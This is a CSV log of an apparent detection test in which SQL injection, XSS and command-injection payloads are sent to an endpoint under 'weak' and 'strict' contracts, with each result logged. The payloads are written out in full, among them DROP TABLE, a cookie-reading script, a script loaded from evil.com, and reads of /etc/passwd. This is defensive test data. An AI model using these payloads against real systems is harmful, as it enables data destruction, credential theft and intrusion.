timestamp,attack_type,description,payload,contract_type,result,http_status,response_body
2025-10-12T16:41:20.280995,SQLi,Classic Tautology,' OR 1=1--,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.287240,SQLi,Classic Tautology,' OR 1=1--,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.393458,SQLi,Tautology with Comment,' OR 'a'='a,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.395305,SQLi,Tautology with Comment,' OR 'a'='a,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.502200,SQLi,Boolean-based Blind,AND 1=1,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.508961,SQLi,Boolean-based Blind,AND 1=1,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.613615,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Weak Contract,ALLOWED,200,"{""pattern_name"": ""SQLi Union"", ""status"": ""pattern_received""}"
2025-10-12T16:41:20.620473,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Strict Contract,ALLOWED,200,"{""pattern_name"": ""SQLi Union"", ""status"": ""pattern_received""}"
2025-10-12T16:41:20.724839,SQLi,Stacked Query,'; DROP TABLE members;--,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.727199,SQLi,Stacked Query,'; DROP TABLE members;--,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.834207,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.841326,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.946531,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:20.952797,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.061789,SQLi,Authentication Bypass,admin'--,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.068012,SQLi,Authentication Bypass,admin'--,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.177218,SQLi,Double Quote Tautology,""" OR 1=1--",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.183941,SQLi,Double Quote Tautology,""" OR 1=1--",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.291313,SQLi,Wildcard Bypass,' OR '%'=',Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.297231,SQLi,Wildcard Bypass,' OR '%'=',Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.406155,XSS,Basic Script Tag,<script>alert('XSS')</script>,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T16:41:21.412670,XSS,Basic Script Tag,<script>alert('XSS')</script>,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T16:41:21.521619,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-12T16:41:21.528380,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-12T16:41:21.637446,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.643782,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.750777,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.753774,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.860941,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.868042,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:21.975070,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T16:41:21.981181,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T16:41:22.090195,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.096601,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.205623,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.211679,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.320945,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.327090,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.434179,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.440479,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.546671,Cmd Injection,Simple Pipe,| whoami,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.552295,Cmd Injection,Simple Pipe,| whoami,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.659156,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:41:22.665589,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:41:22.774458,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:41:22.776979,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:41:22.883968,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.890145,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:22.998137,Cmd Injection,Backticks,`uname -a`,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:41:23.004631,Cmd Injection,Backticks,`uname -a`,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:41:23.109144,Cmd Injection,Command Substitution,$(reboot),Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:41:23.114956,Cmd Injection,Command Substitution,$(reboot),Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
